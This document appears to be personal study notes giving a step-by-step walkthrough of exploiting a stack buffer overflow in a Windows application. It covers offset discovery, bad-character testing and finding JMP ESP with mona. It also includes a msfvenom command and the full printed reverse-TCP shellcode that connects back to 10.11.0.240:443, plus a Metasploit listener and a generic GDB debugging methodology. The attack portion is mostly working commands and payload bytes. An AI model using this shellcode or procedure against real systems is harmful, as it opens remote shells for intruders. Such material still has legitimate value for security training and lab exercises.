# Buffer overflow (BOF)

This is a step-by-step exploitng a windows application vulnerable to BOF. 

Tools:
- Download Immunity Debugger and install Mona (https://github.com/corelan/mona)
- Drop mona.py into the 'PyCommands' folder (inside the Immunity Debugger application folder).

https://github.com/corelan/mona

# Create unique pattern to find offset

Create a unique pattern and feed the exploit with this to identify the exact position of EIP. In the example it will be create a unique string of 2700 chars

```
$ msf-pattern_create -l 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8A....
```

Open the vulnerable applciation on Immunity Debugger and execute. Check the EIP value, in this example it shows
```
39 69 44 38
```

# Find exact string position where EIP will be overwritten

Feed the values that is on EIP register to find the offset
```
> msf-pattern_offset.rb -q 39694438
[*] Exact match at offset 2606
```
In this example it will take 2606 chars until it gets to the EIP register. For example, if we want to fill the EIP register with B's we would send this string:
```
string = "A" * 2606 + "BBBB" + "C" * 500
```

Now that we control the  EIP we can manipulate the program flow. We can make the program execute a shell code that we want

# Size of shellcode
Keep in mind that sometimes we need to care about the Shellcode size. 
ShellCode for a reverse _tcp.
350 and 400 bytes of space

# Finding bad chars Bad Chars
Buffer Overlow when using string copy: 
- null hex code: 00 (because it flag end of the string so everything after the null byte will be ignored)
- 0x0D (return carriage)
- ax0A (line feed)

Send all chars from \x00 to \xFF and manually check in the memory dump each value if it's in the correct order.
Let's say that you look into the memory dumo and see: "\x00\x01\xB0" in this case the char after \x01 should be \x02 but we got \B0. 

It means that \x02 is a bad char, remove the \x02 from the string and send it again. Repeat the process until all bad chars are gone.

```
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
# Find modules and dlls used by a program, in this way I can try to use a DLL do JMP to my ESP
We a looking for a DLL that was compiled without ASLR, SafeSEH, NXCompat
```
!mona modules
!mona find -s "\xff\xe4" -m slmfc.dll
```

# Finding out opcode for each instructions
it makes easier to search inside the debugger for this instruction

> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp

# Creating a shellcode
> msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.240 LPORT=443 -f c -a x86 --platform windows -b '\x00\x0d\x0a' -e x86/shikata_ga_nai
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xed\xb8\x08\x9c\xb4\xea\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x17\x83\xea\xfc\x03\x4a\x8f\x56\x1f\xb6\x47\x14"
"\xe0\x46\x98\x79\x68\xa3\xa9\xb9\x0e\xa0\x9a\x09\x44\xe4\x16"
"\xe1\x08\x1c\xac\x87\x84\x13\x05\x2d\xf3\x1a\x96\x1e\xc7\x3d"
"\x14\x5d\x14\x9d\x25\xae\x69\xdc\x62\xd3\x80\x8c\x3b\x9f\x37"
"\x20\x4f\xd5\x8b\xcb\x03\xfb\x8b\x28\xd3\xfa\xba\xff\x6f\xa5"
"\x1c\xfe\xbc\xdd\x14\x18\xa0\xd8\xef\x93\x12\x96\xf1\x75\x6b"
"\x57\x5d\xb8\x43\xaa\x9f\xfd\x64\x55\xea\xf7\x96\xe8\xed\xcc"
"\xe5\x36\x7b\xd6\x4e\xbc\xdb\x32\x6e\x11\xbd\xb1\x7c\xde\xc9"
"\x9d\x60\xe1\x1e\x96\x9d\x6a\xa1\x78\x14\x28\x86\x5c\x7c\xea"
"\xa7\xc5\xd8\x5d\xd7\x15\x83\x02\x7d\x5e\x2e\x56\x0c\x3d\x27"
"\x9b\x3d\xbd\xb7\xb3\x36\xce\x85\x1c\xed\x58\xa6\xd5\x2b\x9f"
"\xc9\xcf\x8c\x0f\x34\xf0\xec\x06\xf3\xa4\xbc\x30\xd2\xc4\x56"
"\xc0\xdb\x10\xf8\x90\x73\xcb\xb9\x40\x34\xbb\x51\x8a\xbb\xe4"
"\x42\xb5\x11\x8d\xe9\x4c\xf2\xb8\xe6\x4e\xf2\xd5\xfa\x4e\xf3"
"\x9e\x72\xa8\x99\xf0\xd2\x63\x36\x68\x7f\xff\xa7\x75\x55\x7a"
"\xe7\xfe\x5a\x7b\xa6\xf6\x17\x6f\x5f\xf7\x6d\xcd\xf6\x08\x58"
"\x79\x94\x9b\x07\x79\xd3\x87\x9f\x2e\xb4\x76\xd6\xba\x28\x20"
"\x40\xd8\xb0\xb4\xab\x58\x6f\x05\x35\x61\xe2\x31\x11\x71\x3a"
"\xb9\x1d\x25\x92\xec\xcb\x93\x54\x47\xba\x4d\x0f\x34\x14\x19"
"\xd6\x76\xa7\x5f\xd7\x52\x51\xbf\x66\x0b\x24\xc0\x47\xdb\xa0"
"\xb9\xb5\x7b\x4e\x10\x7e\x8b\x05\x38\xd7\x04\xc0\xa9\x65\x49"
"\xf3\x04\xa9\x74\x70\xac\x52\x83\x68\xc5\x57\xcf\x2e\x36\x2a"
"\x40\xdb\x38\x99\x61\xce";

# Waiting for a reverse shell
Open metasploit and use the same payload that was used to create the shellcode and listen for the connection.
Sometimes, listening only with Netcat is not enough

```use exploit/multi/handler```





##Methodology

1. Investigate the file
```
file
strings
```

2. Test it out - what does the program do?

3. Look at its functions in GDB

```
info functions
```

4. Look at the assembly of a function

```
disass main
disass otherfunction
```

5. Look for the flow of the program. Look for cmp

6. Set up breakpoints with hooks

```
define hook-stop
info registers  ;show the registers
x/24xw $esp  ;show the stack
x/2i $eip  ;show the new two instructions
end
```

7. Step through the whole program. Or at the breakpoints

```
si ;steps one forward, but follows functions
ni ;does not follow functions
```
